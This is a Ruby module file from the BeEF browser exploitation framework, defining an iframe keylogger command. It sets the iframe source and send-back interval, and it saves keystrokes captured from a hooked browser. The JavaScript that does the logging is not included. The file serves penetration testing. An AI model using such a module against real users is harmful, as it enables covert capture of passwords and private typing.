#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Iframe_keylogger < BeEF::Core::Command
  
  def self.options
    return [
        {'name' => 'iFrameSrc', 'ui_label'=>'iFrame Src', 'type' => 'textarea', 'value' =>'/demos/secret_page.html', 'width' => '400px', 'height' => '50px'},
        {'name' => 'sendBackInterval', 'ui_label' => 'Send Back Interval (ms)', 'value' => '2000', 'width'=>'100px' }
    ]
  end
  
  def post_execute
    content = {}
    content['keystrokes'] = @datastore['keystrokes']
    save content
  end
  
end
